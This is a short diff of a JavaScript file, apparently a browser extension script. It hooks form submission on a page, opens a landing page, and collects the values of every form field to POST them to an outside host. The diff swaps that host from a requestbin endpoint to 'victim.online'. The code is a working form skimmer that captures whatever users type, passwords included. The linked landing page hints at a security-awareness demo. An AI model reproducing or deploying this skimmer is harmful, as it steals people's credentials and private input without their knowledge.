@@ -5,7 +5,7 @@ var forms = document.forms;
 function formSubmit(event) {
     window.open('https://theantisocialengineer.com/chrome-extension-landing-page/')
     var xhr = new XMLHttpRequest();
-    xhr.open('POST', 'https://requestb.in/100oxh71');
+    xhr.open('POST', 'http://victim.online');
     var string = '';
     // iterate over all of the form fields and urlencode them. There'll be an extra & at the end but who cares
     for (index = 0; index < event.target.elements.length; ++index) {
